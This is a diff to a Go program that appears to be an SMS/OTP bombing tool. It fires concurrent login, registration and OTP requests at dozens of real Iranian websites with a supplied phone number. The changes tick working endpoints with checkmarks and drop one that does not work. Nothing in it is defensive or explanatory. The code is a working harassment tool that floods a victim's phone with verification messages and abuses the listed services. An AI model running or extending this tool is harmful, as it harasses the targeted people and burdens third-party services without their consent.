@@ -645,7 +645,7 @@ cookieJar, _ := cookiejar.New(nil)
 				sendJSONRequest(c, ctx, "https://oldpanel.avalpardakht.com/panel/api/v1/auth/register", payload, &wg, ch)
 			}
 		}(client)
-		// digido.ir
+		// digido.ir ✅ 
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() {
 			return func() {
@@ -844,7 +844,7 @@ cookieJar, _ := cookiejar.New(nil)
 			}
 		}(client) 
 
-		// wisgoon.com (Login - POST JSON)
+		// wisgoon.com (Login - POST JSON) ✅ 
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() { 
 			return func() {
@@ -856,7 +856,7 @@ cookieJar, _ := cookiejar.New(nil)
 				sendJSONRequest(c, ctx, "https://gateway.wisgoon.com/api/v1/auth/login/", payload, &wg, ch)
 			}
 		}(client) 
-		// balad.ir - POST JSON
+		// balad.ir - POST JSON ✅ 
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() {
 			return func() {
@@ -922,7 +922,7 @@ cookieJar, _ := cookiejar.New(nil)
 				sendFormRequest(c, ctx, "https://skmei-iran.com/api/customer/member/register/", formData, &wg, ch)
 			}
 		}(client)
-		// hoomangold.com panel (Login/OTP - POST Form)
+		// hoomangold.com panel (Login/OTP - POST Form) ✅ 
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() {
 			return func() {
@@ -934,7 +934,7 @@ cookieJar, _ := cookiejar.New(nil)
 				sendFormRequest(c, ctx, "https://hoomangold.com/panel/?endp=step-2", formData, &wg, ch)
 			}
 		}(client)
-		// gateway.joordaroo.com request-otp (OTP - POST JSON)
+		// gateway.joordaroo.com (OTP - POST JSON) ✅ 
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() {
 			return func() {
@@ -1003,7 +1003,7 @@ cookieJar, _ := cookiejar.New(nil)
 				sendFormRequest(c, ctx, "https://narsisbeauty.com/wp-admin/admin-ajax.php", formData, &wg, ch)
 			}
 		}(client)
-		// davidjonesonline.ir login_request (Login/OTP - POST JSON)
+		// davidjonesonline.ir (Login/OTP - POST JSON) ✅ 
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() {
 			return func() {
@@ -1093,7 +1093,7 @@ cookieJar, _ := cookiejar.New(nil)
 			}
 		}(client) 
 
-		// eaccount.ir (SMS - POST JSON)
+		// eaccount.ir (SMS - POST JSON) ✅ 
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() { 
 			return func() {
@@ -1125,7 +1125,7 @@ cookieJar, _ := cookiejar.New(nil)
 			}
 		}(client) 
 
-		// dastaneman.com (SMS - POST Form)
+		// dastaneman.com (SMS - POST Form) ✅ 
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() { 
 			return func() {
@@ -1225,7 +1225,7 @@ cookieJar, _ := cookiejar.New(nil)
 			}
 		}(client)
 
-		// api.elinorboutique.com (SMS - POST Form)
+		// api.elinorboutique.com (SMS - POST Form) ✅ 
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() { 
 			return func() {
@@ -1236,7 +1236,7 @@ cookieJar, _ := cookiejar.New(nil)
 			}
 		}(client) 
 
-		// benedito.ir (SMS - POST Form)
+		// benedito.ir (SMS - POST Form) ✅ 
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() { 
 			return func() {
@@ -1421,7 +1421,7 @@ cookieJar, _ := cookiejar.New(nil)
 			}
 		}(client) 
 
-		// lintagame.com (POST Form)
+		// lintagame.com (POST Form) ✅ 
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() { 
 			return func() {
@@ -1431,17 +1431,6 @@ cookieJar, _ := cookiejar.New(nil)
 				sendFormRequest(c, ctx, "https://lintagame.com/wp-admin/admin-ajax.php", formData, &wg, ch)
 			}
 		}(client) 
-		// account.api.balad.ir (POST JSON)
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() { 
-			return func() {
-				payload := map[string]interface{}{
-					"phone_number": phone,
-					"os_type":      "W",
-				}
-				sendJSONRequest(c, ctx, "https://account.api.balad.ir/api/web/auth/login/", payload, &wg, ch) 
-			}
-		}(client)
 
 		// core-api.mayava.ir (POST JSON)
 		wg.Add(1)
@@ -1859,8 +1848,8 @@ cookieJar, _ := cookiejar.New(nil)
 				}, &wg, ch)
 			}
 		}(client)
-
-		// alopeyk.com (JSON) 
+// az in 2 ta yekish kar mikoneh fekr konam.
+		// alopeyk.com (JSON)  ✅ 
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() { 
 			return func() {
@@ -1870,7 +1859,7 @@ cookieJar, _ := cookiejar.New(nil)
 			}
 		}(client)
 
-		// alopeyk.com (JSON)
+		// alopeyk.com (JSON) ✅ 
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() {
 			return func() {
@@ -1880,7 +1869,7 @@ cookieJar, _ := cookiejar.New(nil)
 			}
 		}(client) 
 
-		// pinket.com (JSON)
+		// pinket.com (JSON) ✅ 
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() { 
 			return func() {
@@ -1970,7 +1959,7 @@ cookieJar, _ := cookiejar.New(nil)
 			}
 		}(client)
 
-		// classino.com (JSON)
+		// classino.com (JSON) ✅ 
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() {
 			return func() {
@@ -2031,7 +2020,7 @@ cookieJar, _ := cookiejar.New(nil)
 			}
 		}(client)
 
-		// ponisha.ir (JSON)
+		// ponisha.ir (JSON) ✅ 
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() {
 			return func() {
@@ -2142,7 +2131,7 @@ cookieJar, _ := cookiejar.New(nil)
 			}
 		}(client)
 
-		// tetherland.com (JSON)
+		// tetherland.com (JSON) ✅ 
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() { 
 			return func() {
